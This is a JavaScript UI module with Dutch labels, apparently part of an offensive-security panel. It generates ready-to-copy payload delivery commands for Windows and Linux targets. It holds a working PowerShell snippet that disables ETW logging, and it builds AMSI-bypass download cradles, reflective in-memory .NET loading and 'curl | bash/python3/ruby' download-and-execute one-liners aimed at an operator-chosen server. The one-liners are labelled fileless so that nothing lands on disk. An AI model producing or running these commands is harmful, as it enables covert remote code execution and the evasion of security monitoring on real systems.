/**
 * payload-inject.js — stapsgewijs + fileless delivery sectie
 *
 * Gebruik via data-attributen (CSP-safe, geen inline scripts nodig):
 *   <div data-payload-inject
 *        data-prefix="isc"
 *        data-form="gen-form"
 *        data-default-file="payloads/invoke-shellcode.ps1"
 *        data-insert-after="uitvoer-card">
 *   </div>
 *
 * Of programmatisch:
 *   PayloadInject({ insertAfter: el, formId: 'gen-form', prefix: 'isc', defaultFile: '...' })
 */
(function () {
  'use strict';

  var ETW = '$p=[Ref].Assembly.GetType(\'System.Management.Automation.Tracing.PSEtwLogProvider\')' +
    '.GetField(\'etwProvider\',\'NonPublic,Static\').GetValue($null);' +
    '[Void]$p.GetType().GetField(\'m_enabled\',\'NonPublic,Instance\').SetValue($p,[Byte]0)';

  // ── Helpers ───────────────────────────────────────────────────────────────

  function ext(url) {
    return (url || '').split('?')[0].split('.').pop().toLowerCase();
  }

  function isWindows(e) { return e === 'ps1' || e === 'exe' || e === 'cs'; }

  function saveUrl(val, cb) {
    var csrf = (document.getElementById('finding-csrf') || {}).value || '';
    fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
      body: JSON.stringify({ localhost: val }),
    }).then(function (r) { return r.json(); }).then(function (d) { if (d.ok) cb(); });
  }

  function copyText(text, btn) {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text);
    } else {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.cssText = 'position:fixed;opacity:0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    }
    var orig = btn.textContent;
    btn.textContent = 'Gekopieerd!';
    setTimeout(function () { btn.textContent = orig; }, 1200);
  }

  // ── DOM helpers ───────────────────────────────────────────────────────────

  function mk(tag, cls) {
    var e = document.createElement(tag);
    if (cls) e.className = cls;
    return e;
  }

  function mkBtn(cls, text, type) {
    var b = mk('button', cls);
    b.type = type || 'button';
    b.textContent = text;
    return b;
  }

  function mkSnippet(codeEl, btnEl) {
    var snip = mk('div', 'shell-snippet');
    snip.appendChild(codeEl);
    snip.appendChild(btnEl);
    return snip;
  }

  function mkCatHeader(text) {
    var d = mk('div', 'shell-cat-header');
    d.textContent = text;
    return d;
  }

  // ── Commando's bouwen per bestandstype ────────────────────────────────────

  function buildDelivery(fileUrl, baseUrl, noAmsi, noEtw) {
    var e       = ext(fileUrl);
    var name    = fileUrl.split('/').pop().split('?')[0];
    var base    = baseUrl.replace(/\/$/, '');
    var amsiUrl = base + '/payloads/amsi-bypass.ps1';
    var amsiCmd = "IEX(New-Object Net.WebClient).downloadString('" + amsiUrl + "')";
    var dest    = 'C:\\Windows\\Tasks\\' + name;

    var steps = [], filelessFull, filelessBare, filelessNote;

    if (e === 'ps1') {
      var iexCmd = "IEX(New-Object Net.WebClient).downloadString('" + fileUrl + "')";
      if (!noAmsi) steps.push({ hdr: 'AMSI bypass',       cmd: amsiCmd });
      if (!noEtw)  steps.push({ hdr: 'ETW bypass',        cmd: ETW });
      steps.push(             { hdr: 'Laden & uitvoeren', cmd: iexCmd });
      filelessBare = iexCmd;
      var flp = [];
      if (!noAmsi) flp.push(amsiCmd);
      if (!noEtw)  flp.push(ETW);
      flp.push(iexCmd);
      filelessFull = flp.join('; ');
      filelessNote = 'PS1 wordt direct in geheugen geladen via IEX — niets op schijf.';

    } else if (e === 'exe' || e === 'cs') {
      var dlCmd  = "(New-Object Net.WebClient).DownloadFile('" + fileUrl + "','" + dest + "')";
      var exeCmd = 'Start-Process "' + dest + '"';
      if (!noAmsi) steps.push({ hdr: 'AMSI bypass', cmd: amsiCmd });
      if (!noEtw)  steps.push({ hdr: 'ETW bypass',  cmd: ETW });
      steps.push(             { hdr: 'Downloaden',  cmd: dlCmd });
      steps.push(             { hdr: 'Uitvoeren',   cmd: exeCmd });
      filelessBare = '$b=(New-Object Net.WebClient).DownloadData(\'' + fileUrl + '\');' +
        '[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)';
      var flp2 = [];
      if (!noAmsi) flp2.push(amsiCmd);
      if (!noEtw)  flp2.push(ETW);
      flp2.push(filelessBare);
      filelessFull = flp2.join('; ');
      filelessNote = 'Werkt voor managed .NET assemblies. Shellcode-EXE: gebruik invoke-shellcode.ps1 als cradle.';

    } else if (e === 'sh') {
      steps.push({ hdr: 'Downloaden', cmd: 'curl "' + fileUrl + '" -o /tmp/' + name });
      steps.push({ hdr: 'Uitvoeren',  cmd: 'bash /tmp/' + name });
      filelessBare = 'curl "' + fileUrl + '" | bash';
      filelessFull = filelessBare;
      filelessNote = 'Bash script wordt direct gepiped naar bash.';

    } else if (e === 'py') {
      steps.push({ hdr: 'Downloaden', cmd: 'curl "' + fileUrl + '" -o /tmp/' + name });
      steps.push({ hdr: 'Uitvoeren',  cmd: 'python3 /tmp/' + name });
      filelessBare = 'curl "' + fileUrl + '" | python3';
      filelessFull = filelessBare;
      filelessNote = 'Python script wordt direct gepiped naar python3.';

    } else if (e === 'rb') {
      steps.push({ hdr: 'Downloaden', cmd: 'curl "' + fileUrl + '" -o /tmp/' + name });
      steps.push({ hdr: 'Uitvoeren',  cmd: 'ruby /tmp/' + name });
      filelessBare = 'curl "' + fileUrl + '" | ruby';
      filelessFull = filelessBare;
      filelessNote = 'Ruby script wordt direct gepiped naar ruby.';

    } else if (e === 'elf') {
      steps.push({ hdr: 'Downloaden',  cmd: 'curl "' + fileUrl + '" -o /tmp/' + name });
      steps.push({ hdr: 'Uitvoerbaar', cmd: 'chmod +x /tmp/' + name });
      steps.push({ hdr: 'Uitvoeren',   cmd: '/tmp/' + name });
      filelessBare = 'curl "' + fileUrl + '" -o /tmp/' + name + ' && chmod +x /tmp/' + name + ' && /tmp/' + name;
      filelessFull = filelessBare;
      filelessNote = 'ELF binary — minimale footprint: download, chmod en direct uitvoeren.';

    } else {
      steps.push({ hdr: 'Downloaden', cmd: 'curl "' + fileUrl + '" -o /tmp/' + name });
      steps.push({ hdr: 'Uitvoeren',  cmd: '/tmp/' + name });
      filelessBare = 'curl "' + fileUrl + '" -o /tmp/' + name + ' && /tmp/' + name;
      filelessFull = filelessBare;
      filelessNote = '';
    }

    var allParts = steps.map(function (s) { return s.cmd; });
    return { steps: steps, all: allParts.join('; '), filelessFull: filelessFull, filelessBare: filelessBare, filelessNote: filelessNote };
  }

  // ── DOM opbouwen ──────────────────────────────────────────────────────────

  function buildModal(title, inputLabel, placeholder, helpText, hasStatus) {
    var overlay = mk('div', 'modal-overlay d-none');

    var box    = mk('div', 'modal-box modal-md');
    var head   = mk('div', 'modal-head');
    var h3     = mk('h3');  h3.textContent = title;
    var xBtn   = mkBtn('modal-close-btn', '\u00d7');
    head.appendChild(h3);
    head.appendChild(xBtn);

    var body   = mk('div', 'modal-body');
    var lbl    = mk('label', 'form-label'); lbl.textContent = inputLabel;
    var input  = mk('input', 'form-control');
    input.type = 'text'; input.placeholder = placeholder;
    body.appendChild(lbl);
    body.appendChild(input);
    if (helpText) {
      var help = mk('p', 'help mt-8'); help.textContent = helpText;
      body.appendChild(help);
    }

    var foot      = mk('div', 'modal-foot d-flex gap-8 justify-end');
    var statusEl  = null;
    if (hasStatus) {
      statusEl = mk('span', 'status');
      foot.appendChild(statusEl);
    }
    var cancelBtn = mkBtn('btn', 'Annuleren');
    var saveBtn   = mkBtn('btn btn-primary', hasStatus ? 'Opslaan' : 'Toepassen');
    foot.appendChild(cancelBtn);
    foot.appendChild(saveBtn);

    box.appendChild(head);
    box.appendChild(body);
    box.appendChild(foot);
    overlay.appendChild(box);

    function close() { overlay.classList.add('d-none'); }

    xBtn.addEventListener('click', close);
    cancelBtn.addEventListener('click', close);
    overlay.addEventListener('click', function (ev) { if (ev.target === overlay) close(); });
    input.addEventListener('keydown', function (ev) {
      if (ev.key === 'Enter')  saveBtn.click();
      if (ev.key === 'Escape') close();
    });

    return {
      el: overlay,
      input: input,
      saveBtn: saveBtn,
      statusEl: statusEl,
      open: function (val) {
        input.value = val || '';
        if (statusEl) statusEl.textContent = '';
        overlay.classList.remove('d-none');
        input.focus();
        input.select();
      },
      close: close,
    };
  }

  function buildSections() {
    var frag = document.createDocumentFragment();

    // ── Config card ──────────────────────────────────────────────────────────
    var cfgSec  = mk('section', 'card mt-14');
    var cfgHead = mk('div', 'card-head');
    var cfgH2   = mk('h2'); cfgH2.textContent = 'Payload delivery';
    cfgHead.appendChild(cfgH2);

    var cfgBody = mk('div', 'card-body');
    var cfgForm = mk('div', 'gen-form');

    // Basis URL veld
    var baseField = mk('div', 'field');
    var baseLbl   = mk('label'); baseLbl.textContent = 'Basis URL';
    var baseRow   = mk('div', 'ia-url-row');
    var baseDisp  = mk('div', 'ia-settings-url'); baseDisp.textContent = 'laden\u2026';
    var baseBtn   = mkBtn('btn', 'Wijzigen');
    baseRow.appendChild(baseDisp);
    baseRow.appendChild(baseBtn);
    baseField.appendChild(baseLbl);
    baseField.appendChild(baseRow);

    // Payload URL veld
    var fileField = mk('div', 'field');
    var fileLbl   = mk('label'); fileLbl.textContent = 'Payload URL';
    var fileRow   = mk('div', 'ia-url-row');
    var fileDisp  = mk('div', 'ia-settings-url'); fileDisp.textContent = '\u2014';
    var fileBtn   = mkBtn('btn', 'Wijzigen');
    fileRow.appendChild(fileDisp);
    fileRow.appendChild(fileBtn);
    fileField.appendChild(fileLbl);
    fileField.appendChild(fileRow);

    // Bypass veld (AMSI + ETW)
    var bypassField = mk('div', 'field');
    var bypassRow   = mk('div', 'ia-checkbox-row');

    var amsiLbl = mk('label', 'ia-checkbox-label');
    var amsiChk = mk('input');
    amsiChk.type = 'checkbox'; amsiChk.checked = true;
    amsiLbl.appendChild(amsiChk);
    amsiLbl.appendChild(document.createTextNode(' AMSI bypass'));

    var etwLbl = mk('label', 'ia-checkbox-label');
    var etwChk = mk('input');
    etwChk.type = 'checkbox'; etwChk.checked = true;
    etwLbl.appendChild(etwChk);
    etwLbl.appendChild(document.createTextNode(' ETW bypass'));

    bypassRow.appendChild(amsiLbl);
    bypassRow.appendChild(etwLbl);
    bypassField.appendChild(bypassRow);

    cfgForm.appendChild(baseField);
    cfgForm.appendChild(fileField);
    cfgForm.appendChild(bypassField);
    cfgBody.appendChild(cfgForm);
    cfgSec.appendChild(cfgHead);
    cfgSec.appendChild(cfgBody);

    // ── Stappen card ─────────────────────────────────────────────────────────
    var stepsSec  = mk('section', 'card mt-14 d-none');
    var stepsHead = mk('div', 'card-head');
    var stepsH2   = mk('h2'); stepsH2.textContent = 'Gegenereerde aanroep \u2014 stapsgewijs';
    stepsHead.appendChild(stepsH2);
    var stepsBody  = mk('div', 'card-body');
    var stepsInner = mk('div', 'shell-category');
    stepsBody.appendChild(stepsInner);
    stepsSec.appendChild(stepsHead);
    stepsSec.appendChild(stepsBody);

    // ── Fileless card ────────────────────────────────────────────────────────
    var filelessSec  = mk('section', 'card mt-14 d-none');
    var filelessHead = mk('div', 'card-head');
    var filelessH2   = mk('h2'); filelessH2.textContent = 'Fileless \u2014 geen bestand op schijf';
    filelessHead.appendChild(filelessH2);

    var filelessBody = mk('div', 'card-body');
    var noteEl = mk('p', 'text-muted fs-12 mb-8');

    var filelessCat  = mk('div', 'shell-category');

    var oneCode    = mk('code');
    var oneCopyBtn = mkBtn('btn-copy', 'Kopieer');
    filelessCat.appendChild(mkCatHeader('One-liner (bypasses inbegrepen)'));
    filelessCat.appendChild(mkSnippet(oneCode, oneCopyBtn));

    var bareCode    = mk('code');
    var bareCopyBtn = mkBtn('btn-copy', 'Kopieer');
    filelessCat.appendChild(mkCatHeader('Alleen laden (geen bypasses)'));
    filelessCat.appendChild(mkSnippet(bareCode, bareCopyBtn));

    filelessBody.appendChild(noteEl);
    filelessBody.appendChild(filelessCat);
    filelessSec.appendChild(filelessHead);
    filelessSec.appendChild(filelessBody);

    // ── Modals ────────────────────────────────────────────────────────────────
    var baseModal = buildModal(
      'Basis URL aanpassen', 'URL',
      'https://10.0.0.1:443',
      'Bijv. http://10.0.0.1 of https://10.0.0.1:8443',
      true
    );
    var fileModal = buildModal(
      'Payload URL aanpassen', 'Volledige URL',
      'http://10.0.0.1/payloads/shell.ps1',
      null, false
    );

    frag.appendChild(cfgSec);
    frag.appendChild(stepsSec);
    frag.appendChild(filelessSec);
    frag.appendChild(baseModal.el);
    frag.appendChild(fileModal.el);

    return {
      frag: frag,
      // config
      baseDisp: baseDisp, baseBtn: baseBtn,
      fileDisp: fileDisp, fileBtn: fileBtn,
      bypassField: bypassField, amsiChk: amsiChk, etwChk: etwChk,
      // stappen
      stepsSec: stepsSec, stepsInner: stepsInner,
      // fileless
      filelessSec: filelessSec, noteEl: noteEl,
      oneCode: oneCode, oneCopyBtn: oneCopyBtn,
      bareCode: bareCode, bareCopyBtn: bareCopyBtn,
      // modals
      baseModal: baseModal, fileModal: fileModal,
    };
  }

  // ── Stappen renderen ──────────────────────────────────────────────────────

  function renderSteps(inner, delivery) {
    while (inner.firstChild) inner.removeChild(inner.firstChild);

    delivery.steps.forEach(function (s, i) {
      var hdr  = mkCatHeader('Stap ' + (i + 1) + ' \u2014 ' + s.hdr);
      var code = mk('code'); code.textContent = s.cmd;
      var btn  = mkBtn('btn-copy', 'Kopieer');
      btn.addEventListener('click', function () { copyText(s.cmd, btn); });
      inner.appendChild(hdr);
      inner.appendChild(mkSnippet(code, btn));
    });

    var allHdr  = mkCatHeader('Alles in \u00e9\u00e9n');
    var allCode = mk('code'); allCode.textContent = delivery.all;
    var allBtn  = mkBtn('btn-copy', 'Kopieer');
    allBtn.addEventListener('click', function () { copyText(delivery.all, allBtn); });
    inner.appendChild(allHdr);
    inner.appendChild(mkSnippet(allCode, allBtn));
  }

  // ── PayloadInject factory ─────────────────────────────────────────────────

  function PayloadInject(options) {
    var formId      = options.formId || 'gen-form';
    var insertAfterEl = typeof options.insertAfter === 'string'
      ? document.getElementById(options.insertAfter)
      : options.insertAfter;
    var defaultFile = options.defaultFile || '';

    if (!insertAfterEl) return null;

    var dom = buildSections();

    // DOM invoegen na insertAfterEl
    var ref = insertAfterEl.nextSibling;
    var parent = insertAfterEl.parentNode;
    parent.insertBefore(dom.frag, ref);

    var baseUrl = 'http://127.0.0.1';
    var fileUrl = '';

    function update() {
      if (!fileUrl) {
        dom.stepsSec.classList.add('d-none');
        dom.filelessSec.classList.add('d-none');
        return;
      }
      var e = ext(fileUrl);
      dom.bypassField.style.display = isWindows(e) ? '' : 'none';

      var noAmsi = isWindows(e) && !dom.amsiChk.checked;
      var noEtw  = isWindows(e) && !dom.etwChk.checked;
      var del = buildDelivery(fileUrl, baseUrl, noAmsi, noEtw);

      renderSteps(dom.stepsInner, del);
      dom.oneCode.textContent  = del.filelessFull  || '';
      dom.bareCode.textContent = del.filelessBare  || '';
      dom.noteEl.textContent   = del.filelessNote  || '';
      dom.stepsSec.classList.remove('d-none');
      dom.filelessSec.classList.remove('d-none');
    }

    function setFileUrl(url) {
      fileUrl = url;
      dom.fileDisp.textContent = url || '\u2014';
      update();
    }

    function setBaseUrl(url) {
      baseUrl = url.replace(/\/$/, '');
      dom.baseDisp.textContent = baseUrl;
      if (defaultFile && !fileUrl) setFileUrl(baseUrl + '/' + defaultFile);
      else update();
    }

    // Bypass checkboxes
    dom.amsiChk.addEventListener('change', update);
    dom.etwChk.addEventListener('change', update);

    // Copy knoppen fileless
    dom.oneCopyBtn.addEventListener('click',  function () { copyText(dom.oneCode.textContent,  dom.oneCopyBtn); });
    dom.bareCopyBtn.addEventListener('click', function () { copyText(dom.bareCode.textContent, dom.bareCopyBtn); });

    // Base URL modal
    dom.baseBtn.addEventListener('click', function () { dom.baseModal.open(baseUrl); });
    dom.baseModal.saveBtn.addEventListener('click', function () {
      var val = dom.baseModal.input.value.trim();
      if (!val) { if (dom.baseModal.statusEl) dom.baseModal.statusEl.textContent = 'Vul een URL in'; return; }
      if (!/^https?:\/\/.+/.test(val)) { if (dom.baseModal.statusEl) dom.baseModal.statusEl.textContent = 'Moet beginnen met http:// of https://'; return; }
      saveUrl(val, function () { setBaseUrl(val); dom.baseModal.close(); });
    });

    // File URL modal
    dom.fileBtn.addEventListener('click', function () { dom.fileModal.open(fileUrl); });
    dom.fileModal.saveBtn.addEventListener('click', function () {
      setFileUrl(dom.fileModal.input.value.trim());
      dom.fileModal.close();
    });

    // Luister naar generator:done
    var form = document.getElementById(formId);
    if (form) {
      form.addEventListener('generator:done', function (ev) {
        var dlUrl = ev.detail && ev.detail.download_url;
        if (!dlUrl) return;
        var fname  = dlUrl.split('/').pop().split('?')[0];
        var folder = dlUrl.indexOf('/tools') !== -1 ? 'tools' : 'payloads';
        setFileUrl(baseUrl + '/' + folder + '/' + fname);
      });
    }

    // Instellingen ophalen
    fetch('/api/settings')
      .then(function (r) { return r.json(); })
      .then(function (d) {
        var url = (d.localhost || 'http://127.0.0.1').replace(/\/$/, '');
        baseUrl = url;
        dom.baseDisp.textContent = baseUrl;
        if (defaultFile) setFileUrl(baseUrl + '/' + defaultFile);
      });

    return {
      setDefaultFile: function (file) {
        defaultFile = file;
        if (file) setFileUrl(baseUrl + '/' + file);
      },
    };
  }

  // ── Auto-init via data-attributen ─────────────────────────────────────────

  function autoInit() {
    if (!window.__payloadInjectInstances) {
      window.__payloadInjectInstances = new Map();
    }
    var nodes = document.querySelectorAll('[data-payload-inject]');
    for (var i = 0; i < nodes.length; i++) {
      var el      = nodes[i];
      var afterId = el.getAttribute('data-insert-after');
      var after   = afterId ? document.getElementById(afterId) : el.previousElementSibling;
      if (!after) continue;
      var formId = el.getAttribute('data-form') || 'gen-form';
      var pi = PayloadInject({
        insertAfter: after,
        formId:      formId,
        prefix:      el.getAttribute('data-prefix')       || 'pi',
        defaultFile: el.getAttribute('data-default-file') || '',
      });
      if (pi) window.__payloadInjectInstances.set(formId, pi);
      el.parentNode.removeChild(el);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', autoInit);
  } else {
    autoInit();
  }

  window.PayloadInject = PayloadInject;
})();
